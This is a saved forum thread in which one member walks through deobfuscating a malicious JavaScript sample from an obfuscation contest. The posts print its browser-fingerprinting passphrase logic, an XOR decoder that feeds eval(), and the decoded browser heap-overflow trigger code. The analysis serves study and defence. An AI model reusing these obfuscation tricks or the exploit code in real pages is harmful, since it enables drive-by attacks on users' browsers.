/>\r\n<br />\r\nif(uUHIjMJVFJET.indexOf(String.fromCharCode(0157,1  12,0145,114,97)) != -1) <br />\r\n{     <br />\r\nreturn String.fromCharCode(0x6d,0x61,0x54,0150,76,0114,01  32,113,0x50,0155,114,0x72,0x46,0x53);   <br />\r\n}<br />\r\n<br />\r\nNow we need to simplify the String.fromCharCode section.<br />\r\n<br />\r\nYou can use this site to convert String.fromCharCode from a String of Numbers to Characters:<br />\r\n<br />\r\n<a href="http://www.gooby.ca/decrypt/decoders/ord2char.php" target="_blank">http://www.gooby.ca/decrypt/decoders/ord2char.php</a><br />\r\n<br />\r\nIf you input, 0157,112,0145,114,97 in the input box on the site, you will get some weird characters:<br />\r\n<br />\r\n�p‘ra<br />\r\n<br />\r\nSimilarly, try to input, 0x6d,0x61,0x54,0150,76,0114,0132,113,0x50,0155,114  ,0x72,0x46,0x53 and observe the result.<br />\r\n<br />\r\n=6–Lr„q2›rH.5<br />\r\n<br />\r\nThis was the reason, I mentioned above. These values should be in base 10 decimal and not octal or hex. In the obfuscated javascript, a mixture of base 10, base 16 and base 8 numbers were included to trick the reverser.<br />\r\n<br />\r\nThis is where my script comes in handy and saves us the time.<br />\r\n<br />\r\n0157,112,0145,114,97 = 111,112,101,114,97 = opera <br />\r\n0x6d,0x61,0x54,0150,76,0114,0132,113,0x50,0155,114  ,0x72,0x46,0x53 = 109,97,84,104,76,76,90,113,80,109,114,114,70,83 = maThLLZqPmrrFS<br />\r\n<br />\r\nOk, so now our above &quot;if&quot; expression reduces to:<br />\r\n<br />\r\nif(uUHIjMJVFJET.indexOf(opera) != -1) <br />\r\n{     <br />\r\nreturn maThLLZqPmrrFS;   <br />\r\n}<br />\r\n<br />\r\nIt is important to understand this part of the code. Here, uUHIjMJVFJET variable will store the user agent (in lowercase) of the victim\'s browser. We check whether or not the victim is using an Opera Browser. If the victim is using Opera Browser then we return a Random PreGenerated Passphrase, &quot;maThLLZqPmrrFS&quot;.<br />\r\n<br />\r\nThis is the passphrase which will be used to decode the XOR encoded payload which we will see later.<br />\r\n<br />\r\nThere are multiple if statements which will check for the different browser types and depending on that, will return the corresponding passphrase.\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_5753" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_5753" class="newreply" href="newreply.php?do=newreply&amp;p=5753" rel="nofollow" title="Reply With Quote"><img id="quoteimg_5753" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
pd[5754] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_5754">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">09-21-2011,&nbsp;<span class="time">08:41 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post5754" href="showthread.php?t=1516&amp;p=5754&amp;viewfull=1#post5754" class="postcounter">#3</a><a id="postcount5754" name="3"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=311" title="c0d3inj3cT is offline"><strong>c0d3inj3cT</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=311" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=311&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=311" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=311" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/311-c0d3inj3cT" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="c0d3inj3cT is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Garage Member\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_5754_311" title="c0d3inj3cT will become famous soon enough">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Dec 2010</dd>\r\n					\r\n					\r\n					<dt>Posts</dt> <dd>67</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=311">2</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_5754">\r\n						<blockquote class="postcontent restore ">\r\n							Let\'s look at some more tricks which were used to obfuscate.<br />\n<br />\n<b>Addition Operation was Replaced with special symbols.</b><br />\n<br />\nIf you preceed a Number, N with \'~\' symbol. It becomes -(N+1)<br />\n<br />\n~N = -(N+1)<br />\n-~N = N+1<br />\n<br />\nSo, by prefixing -~ to a number N, we are in a way adding 1 to it.<br />\n<br />\nIf you want to add 3 to it, just prefix it with 3 occurences of the above combination of characters.<br />\n<br />\n-~-~-~N = N +3<br />\n<br />\nFor instance, the &quot;if&quot; expression below,<br />\n<br />\nif(uUHIjMJVFJET.indexOf((-~-~\'zgBq\'[720094129..toString(32&lt;&lt;0)+&quot;&quot;]&gt;(0x2*-~-~-~\'tlk\'[720094129..toString(16&lt;&lt;1)+&quot;&quot;]+3)?(function () <br />\n{ var bseY=&quot;iC&quot;,HgWL=&quot;z&quot;,hhme=&quot;q&quot;,FTva=&quot;pmhJtYe&quot;,ohBc=&quot;d  Z&quot;; return hhme+ohBc+HgWL+FTva+bseY })():421389006..toString(32&lt;&lt;0)+&quot;&quot;)) != -\'v\'[720094129..toString(16&lt;&lt;1)+&quot;&quot;]) {     return (function () { var BmIT=\'QW\',jEgm=\'aFa\'; return jEgm+BmIT })();   }<br />\n<br />\nFirst, we will do all the Conversion from Base 10 to Base 32 to get the corresponding Strings.<br />\n<br />\nif(uUHIjMJVFJET.indexOf((-~-~\'zgBq\'[length]&gt;(0x2*-~-~-~\'tlk\'[length]+3)?(function () <br />\n{ var bseY=&quot;iC&quot;,HgWL=&quot;z&quot;,hhme=&quot;q&quot;,FTva=&quot;pmhJtYe&quot;,ohBc=&quot;d  Z&quot;; return hhme+ohBc+HgWL+FTva+bseY })():chrome+&quot;&quot;)) != -\'v\'[length]) {     return (function () { var BmIT=\'QW\',jEgm=\'aFa\'; return jEgm+BmIT })();   }<br />\n<br />\nFocus on this section:<br />\n<br />\n-~-~\'zgBq\'[length]&gt;(0x2*-~-~-~\'tlk\'[length]+3)<br />\n<br />\n\'zgBq\'[length] = 4<br />\n-~-~\'zgBq\'[length] = 4+2 = 6<br />\n-~-~-~\'tlk\'[length] = 3+3 = 6<br />\n<br />\nUsing this knowledge, we can reduce the above &quot;if&quot; expression to:<br />\n<br />\nif(uUHIjMJVFJET.indexOf((6&gt;(18)?(function () <br />\n{ var bseY=&quot;iC&quot;,HgWL=&quot;z&quot;,hhme=&quot;q&quot;,FTva=&quot;pmhJtYe&quot;,ohBc=&quot;d  Z&quot;; return hhme+ohBc+HgWL+FTva+bseY })():chrome+&quot;&quot;)) != -1) {     return (function () { var BmIT=\'QW\',jEgm=\'aFa\'; return jEgm+BmIT })();   }<br />\n<br />\nLet\'s substitute the variable names:<br />\n<br />\nif(uUHIjMJVFJET.indexOf(chrome)) != -1) <br />\n{     <br />\nreturn (function () { return aFaQW })();   <br />\n}<br />\n<br />\nThere were many places, where you can see, (function () { return x })() entries present. I hope it is obvious that this does nothing but returns the value x.<br />\n<br />\nso, the &quot;if&quot; expression reduces further to:<br />\n<br />\nif(uUHIjMJVFJET.indexOf(chrome)) != -1) <br />\n{     <br />\nreturn aFaQW;   <br />\n}<br />\n<br />\nThis section of the code, once again looks similar to our previous &quot;if&quot; expression. It returns the random passphrase, aFaQW if the victim\'s browser is Chrome.\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_5754" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_5754" class="newreply" href="newreply.php?do=newreply&amp;p=5754" rel="nofollow" title="Reply With Quote"><img id="quoteimg_5754" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
pd[5756] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_5756">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">09-21-2011,&nbsp;<span class="time">08:46 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post5756" href="showthread.php?t=1516&amp;p=5756&amp;viewfull=1#post5756" class="postcounter">#4</a><a id="postcount5756" name="4"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=311" title="c0d3inj3cT is offline"><strong>c0d3inj3cT</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=311" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=311&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=311" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=311" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/311-c0d3inj3cT" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="c0d3inj3cT is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Garage Member\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_5756_311" title="c0d3inj3cT will become famous soon enough">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Dec 2010</dd>\r\n					\r\n					\r\n					<dt>Posts</dt> <dd>67</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=311">2</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_5756">\r\n						<blockquote class="postcontent restore ">\r\n							XOR decoding routine:<br />\r\n<br />\r\nNext, we discuss about the XOR decoding routine.<br />\r\n<br />\r\nfunction pjSkrbvs(FSzQjtHkbuMDLW, pOtdvHbBav)<br />\r\n{<br />\r\n<br />\r\nvar UMa = [];<br />\r\nvar VfoamYteBIveYp = &quot;&quot;;<br />\r\n<br />\r\nwhile(pOtdvHbBav.length &lt; FSzQjtHkbuMDLW.length)<br />\r\n{<br />\r\npOtdvHbBav += pOtdvHbBav;<br />\r\n}<br />\r\n<br />\r\nfor(i = 1; i &lt;= 255; i++)<br />\r\n{<br />\r\nUMa[String.fromCharCode(i)] = i; // ASCII Table<br />\r\n}<br />\r\n<br />\r\nfor(i = 0; i &lt; FSzQjtHkbuMDLW.length; i++)<br />\r\n{<br />\r\nVfoamYteBIveYp += String.fromCharCode(UMa[FSzQjtHkbuMDLW.substr(i, 1)] ^ UMa[pOtdvHbBav.substr(i, 1)]); // The XOR decoded result is stored in VfoamYteBIveYp<br />\r\n}<br />\r\nreturn VfoamYteBIveYp; // This returns the XOR decoded String to the eval function to execute<br />\r\n<br />\r\n}<br />\r\n<br />\r\nFurther down in the script we can see a call made to the eval function.<br />\r\n<br />\r\nHere, pjSkrbvs() function takes two arguments, one is the unescaped XOR encoded code and the other is the random passphrase required to decode.<br />\r\n<br />\r\nIt expands the passphrase according to the length of the XOR encoded code.<br />\r\n<br />\r\nUMa[String.fromCharCode(i)] stores all the ASCII Values for the characters.<br />\r\n<br />\r\nThe XOR operation is performed between very character from the XOR encoded string and the expanded passphrase.<br />\r\n<br />\r\nThe entire decoded code is present inside the variable, VfoamYteBIveYp<br />\r\n<br />\r\nThis is returned to the eval() function which executes it in the context of the browser. In the next post, we discuss more about the code returned to the eval() function.\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_5756" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_5756" class="newreply" href="newreply.php?do=newreply&amp;p=5756" rel="nofollow" title="Reply With Quote"><img id="quoteimg_5756" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
pd[5755] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_5755">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">09-21-2011,&nbsp;<span class="time">08:41 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post5755" href="showthread.php?t=1516&amp;p=5755&amp;viewfull=1#post5755" class="postcounter">#5</a><a id="postcount5755" name="5"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=311" title="c0d3inj3cT is offline"><strong>c0d3inj3cT</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=311" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=311&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=311" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=311" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/311-c0d3inj3cT" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="c0d3inj3cT is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Garage Member\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_5755_311" title="c0d3inj3cT will become famous soon enough">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Dec 2010</dd>\r\n					\r\n					\r\n					<dt>Posts</dt> <dd>67</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=311">2</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_5755">\r\n						<blockquote class="postcontent restore ">\r\n							Continuing this way, we can deobfuscate a considerable amount of the code to the following. I have added in appropriate comments wherever needed:<br />\n<br />\nfunction wprcm()<br />\n{<br />\nvar uUHIjMJVFJET = navigator.userAgent.toLowerCase(); // retrieves the Browser\'s User Agent and converts it to lowercase.<br />\n<br />\nif(uUHIjMJVFJET.indexOf(opera) != -1) // is the browser Opera?<br />\n{  <br />\nreturn maThLLZqPmrrFS;			// the Random passphrase which is returned depending on the Browser Type<br />\n}<br />\n<br />\nif(uUHIjMJVFJET.indexOf(firefox) != -1) // is the browser Firefox?<br />\n{   <br />\nreturn (loMAYcXfkUsG);		<br />\n}<br />\n<br />\nif(uUHIjMJVFJET.indexOf(chrome) != -1) // is the browser Chrome?<br />\n{<br />\nreturn (aFaQW);<br />\n}<br />\n<br />\nif(uUHIjMJVFJET.indexOf(safari) != -1) // is the browser Safari?<br />\n{     <br />\nreturn (MjLMl);<br />\n}  <br />\n<br />\nif(uUHIjMJVFJET.indexOf(msie) != -1) // is the browser Microsoft Internet Explorer<br />\n{     <br />\nreturn (nUHCmZfyQBLAg);<br />\n}<br />\n<br />\nif(uUHIjMJVFJET.indexOf(netscape)) != -1) // is the browser Netscape?<br />\n{   <br />\nreturn (IrNFOz);<br />\n}<br />\n<br />\nif(uUHIjMJVFJET.indexOf(mozilla/5.0) != -1) // Is the browser Mozilla?<br />\n{  <br />\nreturn VjtxHZHGKWT; <br />\n}<br />\n<br />\nreturn HEeeeYBsTMItYY; // If none of the above User Agents were detected then return this value<br />\n<br />\n}\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_5755" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_5755" class="newreply" href="newreply.php?do=newreply&amp;p=5755" rel="nofollow" title="Reply With Quote"><img id="quoteimg_5755" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
pd[5757] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_5757">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">09-21-2011,&nbsp;<span class="time">08:51 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post5757" href="showthread.php?t=1516&amp;p=5757&amp;viewfull=1#post5757" class="postcounter">#6</a><a id="postcount5757" name="6"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=311" title="c0d3inj3cT is offline"><strong>c0d3inj3cT</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=311" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=311&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=311" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=311" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/311-c0d3inj3cT" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="c0d3inj3cT is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Garage Member\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_5757_311" title="c0d3inj3cT will become famous soon enough">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Dec 2010</dd>\r\n					\r\n					\r\n					<dt>Posts</dt> <dd>67</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=311">2</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_5757">\r\n						<blockquote class="postcontent restore ">\r\n							The decoded code obtained after running the above XOR decoding routine is once again heavily obfuscated. However, the deobfuscation technique used in the first section of the challenge could be extended here as well.<br />\n<br />\nHere\'s what you get after deobfuscating the XOR decoded code:<br />\n<br />\nfunction LcXiYjzTRSKyzv(jkPfjgfRwzD)<br />\n{ <br />\nvar yGTthPYIyl = document.createElement(jkPfjgfRwzD);<br />\n<br />\nyGTthPYIyl.id = (function () { var sBCT=&quot;zojNX&quot;,PhJW=&quot;e&quot;,xWwp=&quot;HVo&quot;,nGNM=&quot;CliS&quot;,sLOI=  &quot;NQ&quot;; <br />\nreturn xWwp+sLOI+PhJW+nGNM+sBCT })();<br />\n<br />\ndocument.body.appendChild(yGTthPYIyl); <br />\n<br />\nvar ubEtH = document.getElementById(HVoNQeCliSzojNX);<br />\n<br />\nvar tNYrZqXB = new Array(); <br />\n<br />\nfor(ZTAJEHbe in ubEtH) <br />\n{ <br />\nif(typeof (ubEtH[ZTAJEHbe]) == (string)) <br />\n{ <br />\ntNYrZqXB.push(ZTAJEHbe);<br />\n} <br />\n}<br />\n<br />\ndocument.body.removeChild(yGTthPYIyl); <br />\n<br />\nreturn tNYrZqXB;<br />\n}<br />\n<br />\nvar GVMdCQvWMJCdd = new Array(audio, a, base);<br />\n<br />\nfor(ffCQtDBVDxYg = 0; ffCQtDBVDxYg &lt; (1*(1*031475+7281)+14774); ffCQtDBVDxYg++) <br />\n{ <br />\nfor(RRaTtnSjJuAO = 0; RRaTtnSjJuAO &lt; GVMdCQvWMJCdd.length; RRaTtnSjJuAO++)<br />\n{ <br />\nvar tNYrZqXB = LcXiYjzTRSKyzv(GVMdCQvWMJCdd[RRaTtnSjJuAO]);<br />\nfor(ZJrkiEirXmcRNQQ = 0; ZJrkiEirXmcRNQQ &lt; tNYrZqXB.length; ZJrkiEirXmcRNQQ++) <br />\n{ <br />\nvar KeqtLd = &quot;&lt;&quot; + GVMdCQvWMJCdd[RRaTtnSjJuAO] + (String.fromCharCode(32)) + tNYrZqXB[ZJrkiEirXmcRNQQ] + OTe + GVMdCQvWMJCdd[RRaTtnSjJuAO] + &quot;&gt;&quot; + GVMdCQvWMJCdd[RRaTtnSjJuAO]; <br />\ndocument.write(KeqtLd);<br />\n}<br />\n} <br />\n}<br />\n<br />\nIn the challenge we were asked to provide the CVE for this vulnerability. It was an exploit for Remote Heap Overflow Vulnerability in Browser.<br />\n<br />\nMore details about the result can be found here:<br />\n<br />\n<a href="http://www.breakingpointsystems.com/community/blog/javascript-obfuscations-contest-winner/" target="_blank">JavaScript Obfuscations Contest: We Have a Winner | BreakingPoint</a><br />\n<br />\nI am glad to be in the successful entrants list. Looking forward to more challenges.\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_5757" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_5757" class="newreply" href="newreply.php?do=newreply&amp;p=5757" rel="nofollow" title="Reply With Quote"><img id="quoteimg_5757" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';

// next/previous post info
pn[5752] = "5757,5753";
pn[0] = ",5752";
pn[5753] = "5752,5754";
pn[5754] = "5753,5756";
pn[5756] = "5754,5755";
pn[5755] = "5756,5757";
pn[5757] = "5755,5752";

// cached usernames
pu[0] = guestphrase;
pu[311] = "c0d3inj3cT";

// -->
</script>


<div id="threaded_view">
	<h4>Threaded View</h4>

	<div id="posttree">
		<script type="text/javascript">
		<!--
			writeLink(5752, 0, 0, 311, "", "JavaScript Deobfuscation...", "09-21-2011", "08:37 PM", 0, "showthreadef04.html?t=1516&amp;p=5752#post5752");
  writeLink(5753, 0, 0, 311, "T", "<i>This brings us to the next...</i>", "09-21-2011", "08:38 PM", 0, "showthreadb132.html?t=1516&amp;p=5753#post5753");
  writeLink(5754, 0, 0, 311, "T", "<i>Let's look at some more...</i>", "09-21-2011", "08:41 PM", 0, "showthread29dd-2.html?t=1516&amp;p=5754#post5754");
